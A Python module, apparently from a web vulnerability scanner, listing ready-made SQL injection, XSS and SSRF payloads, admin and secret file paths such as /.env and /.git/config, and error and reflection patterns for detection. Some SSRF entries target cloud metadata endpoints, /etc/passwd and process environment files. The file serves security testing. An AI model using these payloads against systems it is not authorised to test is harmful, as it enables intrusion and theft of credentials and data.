"""
Payload library for vulnerability testing.
"""
from typing import List, Dict


class PayloadLibrary:
    """Collection of payloads for different vulnerability types."""
    
    # SQL Injection payloads
    SQL_INJECTION_PAYLOADS: List[str] = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "1' OR '1'='1",
        "1' OR '1'='1' --",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR ('1'='1",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' AND 1=1--",
        "' AND 1=2--",
        "'; WAITFOR DELAY '00:00:05'--",
        "1'; WAITFOR DELAY '00:00:05'--",
        "1' OR SLEEP(5)--",
        "1' OR pg_sleep(5)--",
        "1' OR benchmark(10000000,MD5(1))--",
        "' UNION SELECT user(), database()--",
        "' UNION SELECT @@version--",
    ]
    
    # XSS payloads
    XSS_PAYLOADS: List[str] = [
        "<script>alert('XSS')</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<object data=javascript:alert('XSS')>",
        "<embed src=javascript:alert('XSS')>",
        "javascript:alert('XSS')",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg/onload=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<div onmouseover=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
    ]
    
    # SSRF payloads
    SSRF_PAYLOADS: List[str] = [
        "http://127.0.0.1",
        "http://localhost",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",
        "http://127.0.0.1:27017",
        "http://[::1]",
        "http://[::1]:22",
        "http://0.0.0.0",
        "http://localhost:22",
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///proc/self/environ",
        "gopher://127.0.0.1:6379/_",
        "dict://127.0.0.1:11211",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/latest/user-data/",
    ]
    
    # Access Control test payloads
    ACCESS_CONTROL_PATHS: List[str] = [
        "/admin",
        "/administrator",
        "/admin.php",
        "/admin.html",
        "/admin/",
        "/admin/dashboard",
        "/admin/users",
        "/admin/config",
        "/api/admin",
        "/api/users",
        "/api/config",
        "/config",
        "/config.php",
        "/config.json",
        "/.env",
        "/.git/config",
        "/wp-admin",
        "/phpmyadmin",
        "/phpMyAdmin",
        "/backup",
        "/backups",
        "/test",
        "/test.php",
        "/debug",
        "/debug.php",
    ]
    
    # Security headers to check
    SECURITY_HEADERS: List[str] = [
        "X-Frame-Options",
        "X-Content-Type-Options",
        "X-XSS-Protection",
        "Strict-Transport-Security",
        "Content-Security-Policy",
        "Referrer-Policy",
        "Permissions-Policy",
        "X-Permitted-Cross-Domain-Policies",
    ]
    
    # Common error patterns
    SQL_ERROR_PATTERNS: List[str] = [
        "SQL syntax",
        "MySQL",
        "PostgreSQL",
        "SQLite",
        "ORA-",
        "Microsoft OLE DB",
        "ODBC",
        "SQL Server",
        "SQLException",
        "Warning: mysql_",
        "PostgreSQL query failed",
        "Warning: pg_",
        "SQLite3::",
        "SQLSTATE",
        "syntax error",
        "unclosed quotation mark",
    ]
    
    # XSS reflection indicators
    XSS_REFLECTION_INDICATORS: List[str] = [
        "<script>",
        "javascript:",
        "onerror=",
        "onload=",
        "onclick=",
        "onmouseover=",
        "alert(",
        "document.cookie",
        "String.fromCharCode",
    ]


def get_payloads(vulnerability_type: str) -> List[str]:
    """
    Get payloads for a specific vulnerability type.
    
    Args:
        vulnerability_type: Type of vulnerability (sql_injection, xss, ssrf)
    
    Returns:
        List of payload strings
    """
    payload_lib = PayloadLibrary()
    
    payload_map = {
        "sql_injection": payload_lib.SQL_INJECTION_PAYLOADS,
        "xss": payload_lib.XSS_PAYLOADS,
        "ssrf": payload_lib.SSRF_PAYLOADS,
    }
    
    return payload_map.get(vulnerability_type.lower(), [])

